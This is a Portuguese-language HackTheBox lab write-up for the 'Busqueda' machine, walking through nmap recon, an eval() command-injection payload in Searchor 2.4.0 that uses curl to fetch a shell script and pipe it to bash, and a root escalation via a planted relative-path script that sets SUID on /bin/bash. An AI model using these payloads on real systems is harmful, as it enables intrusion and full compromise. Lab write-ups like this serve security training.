---
title: "HTB — Busqueda"
date: 2026-09-25
type: writeup
tags: [htb, linux, command-injection, privesc, docker]
summary: "Easy Linux box. Command injection via Searchor CLI, depois privesc explorando um script sudo com path relativo."
series: "HackTheBox — Starting Point"
difficulty: easy
platform: htb
draft: true
lang: pt
---

## Recon

```bash
nmap -sC -sV -oN nmap/initial 10.10.11.208
```

Portas abertas: **22 (SSH)** e **80 (HTTP)**. O site redireciona para `searcher.htb` — adicionamos ao `/etc/hosts`.

```
echo "10.10.11.208 searcher.htb" | sudo tee -a /etc/hosts
```

## Enumeração

O site roda **Searchor 2.4.0** — uma ferramenta de linha de comando que faz buscas em vários engines. Versão 2.4.0 tem uma vulnerabilidade conhecida de command injection no parâmetro `query`.

> [!NOTE]
> A versão 2.4.2 já corrige esse bug. Sempre cheque o changelog de ferramentas antes de usá-las em produção.

## Exploração

O `app.py` usa `eval()` para construir a query:

```python
# trecho vulnerável (Searchor 2.4.0)
url = eval(f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})")
```

Payload para injetar código via o parâmetro `query`:

```
',__import__('os').system('curl http://10.10.14.X/shell.sh|bash'))#
```

Recebemos um reverse shell como `svc`.

## Privesc

```bash
sudo -l
# (root) NOPASSWD: /usr/bin/python3 /opt/scripts/system-checkup.py *
```

O script `system-checkup.py` chama `docker-inspect` com caminho **relativo** (`./docker-inspect`). Se conseguirmos criar um `docker-inspect` no diretório atual antes de ele executar, o nosso script roda como root.

```bash
# no /tmp:
cat > docker-inspect << 'EOF'
#!/bin/bash
chmod +s /bin/bash
EOF
chmod +x docker-inspect
sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
/bin/bash -p
```

Root.

## Lições aprendidas

- `eval()` com input do usuário é sempre um buraco. Sem exceções.
- Ao revisar scripts que rodam como sudo, verifique se chamam outros binários com caminho absoluto ou relativo.
- `docker inspect` expõe variáveis de ambiente dos containers — credenciais hardcodadas aparecem ali.
